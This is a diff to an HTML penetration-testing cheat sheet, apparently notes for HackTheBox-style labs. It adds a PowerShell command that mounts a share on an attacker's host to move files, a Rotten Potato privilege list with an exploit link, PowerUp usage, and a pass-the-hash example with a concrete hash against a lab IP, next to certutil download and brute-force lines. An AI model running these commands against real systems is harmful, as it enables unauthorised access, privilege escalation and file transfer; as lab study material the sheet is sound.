@@ -85,6 +85,9 @@ wfuzz -w cewl_output -u streetfighterclub.htb -H "Host: FUZZ.streetfighterclub.h
 </pre>
 <p><h3>Any web port(s) for further enumeration?</h3></p>
 <p><font size="3.5" color="black">"Cewl" the target and "Gobust" using the output wordlist.</font></p>
+<pre style="background-color:black;color:white;">
+cewl -d 10 -m 1 -w cewl_out --with-numbers -a --meta_file cewl_metadata_out -e --email_file cewl_emails_out [URL]
+</pre>
 <p><font size="3.5" color="black">"Nikto" the target.</font></p>
 <p><font size="3.5" color="black">Fuzz directories (HTTP/HTTPS) using ZAP  (/usr/share/secLists/Discovery folder that has some great wordlists for this)</font></p>
 <hr>
@@ -223,7 +226,8 @@ medusa -h [IP_ADDRESS] -U [USERNAME_FILE] -P PASSWORD_FILE] -M http -m DIR:/admi
 </pre>
 <p><font size="3.5" color="black">Using hashcat for cracking hashes:</font></p>
 <pre style="background-color:black;color:white;">
-hashcat -m 400 -a 0 [HASH_FILE] [WORDLIST_FILE]
+# Go to - https://hashcat.net/wiki/doku.php?id=example_hashes to know what module to use in hashcat (Generic hash types)
+hashcat -m [MODULE_NUMBER] -a 0 [HASH_FILE] [WORDLIST_FILE]
 </pre>
 <p><font size="3.5" color="black">Compressed files:</font></p>
 <pre style="background-color:black;color:white;">
@@ -288,6 +292,7 @@ acted upon. This becomes important in pipelining cmdlets.
 </pre>
 <pre style="background-color:black;color:white;">
 C:\> powershell -c "[command]"												#PowerShell cmdlets can be called from cmd.exe
+PS C:\> $psversiontable													#Version of powershell
 PS C:\> Get-Command / PS C:\> gcm *[string]*										#To get a list of all available cmdlets
 PS C:\> Get-Command Set*												#Get-Command supports filtering. To filter cmdlets on the verb set
 PS C:\> Get-Command –Verb Set
@@ -337,6 +342,8 @@ PS C:\> Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\run				
 PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("PSFTW!"))				#Convert string from ascii to Base64
 PS C:\> Get-NetFirewallRule –all											#List and modify the Windows firewall rules
 PS C:\> New-NetFirewallRule -Action Allow -DisplayName LetMeIn -RemoteAddress [IP_ADDRESS]				
+PS C:\> New-PSDrive -Name [SHARE_NAME_TO_BE_CREATED_ON_WIN_BOX] -PSProvider FileSystem -Root "\\[ATTACKERS_IP_ADDRESS]\[SHARE_TO_MOUNT]"	#Mount attacker's share on a win machine for moving files (use impacket-smbserver on attacking box - impacket-smbserver [SHARE_NAME] [PATH_TO_SHARE]) 
+PS C:\> Get-Content -Path "hm.txt" -Stream "root.txt"									#Reading the alternate data stream of a file. Example - hm.txt:root.txt:$DATA
 </pre>
 </br>
 <pre style="background-color:black;color:white;">
@@ -487,6 +494,21 @@ certutil -urlcache -split -f http://[ATTACKERS_MACHINE]/[FILE_TO_TRANSFER] C:\\u
 <p><font size="3.5" color="black">Basic enumeration:</font></p>
 <pre style="background-color:black;color:white;">
 whoami /priv	#user's privileges on the system
+
+#list of privileges that can be abused by Rotten Potato.
+SeImpersonatePrivilege
+SeAssignPrimaryPrivilege
+SeTcbPrivilege
+SeBackupPrivilege
+SeRestorePrivilege
+SeCreateTokenPrivilege
+SeLoadDriverPrivilege
+SeTakeOwnershipPrivilege
+SeDebugPrivilege
+
+#https://github.com/breenmachine/RottenPotatoNG		#Exploit
+
+PowerUp.ps1 (add 'Invoke-AllChecks' at the end of the script and invoke it)	#Powersploit
 sc query state= all type= all | findstr SERVICE_NAME	#enumerate services and drivers
 </pre>
 <p><font size="3.5" color="black">Search for license.rtf / eula.txt:</font></p>
@@ -514,6 +536,11 @@ meterpreter > powershell_shell
 PS > get-applockerpolicy -effective -xml | Out-File -filepath "C:\Users\Public\applock_policy.xml"
 </pre>
 <br>
+<p><font size="3.5" color="black">Pass The Hash:</font></p>
+<pre style="background-color:black;color:white;">
+#Example
+pth-winexe -U jeeves/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd.exe
+</pre>
 <pre style="background-color:black;color:white;">
 accesschk.exe /accepteula (first thing to do in CLI access)
 accesschk.exe /accepteula -uwcqv "Authenticated Users" * (won't yield anything on Win 8)
